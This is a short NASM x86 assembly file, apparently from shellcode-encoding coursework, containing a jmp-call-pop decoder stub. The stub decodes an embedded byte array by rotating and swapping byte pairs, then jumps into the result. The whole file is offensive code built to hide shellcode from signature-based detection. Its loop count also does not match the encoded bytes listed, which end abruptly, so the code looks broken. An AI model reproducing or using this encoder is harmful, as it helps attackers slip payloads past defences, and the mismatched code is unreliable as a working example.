; Filename: kaiten-suwappa.nasm
; Author:  Lucas Kauffman
; Website:  http://cloud101.eu
; Purpose: 

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25


decode:

	mov al, byte  [esi]
	rol al,4
	mov bl, byte [esi+1]
	ror bl,2	
	mov byte [esi], bl
	mov byte [esi+1],al
	add esi,2
	loop decode

	jmp short EncodedShellcode

call_shellcode:

	call decoder

	EncodedShellcode: db 0x13,0x3,0x5,0xa1,0xf2,0xbc,0x37,0xa1,0x86,0xbc,0x26,0xa5,0xe6,0x26,0x3e,0x41,0x98,0x8b,0x35,0x26,0x1e,0xc2,0xb0,0x37,0x8
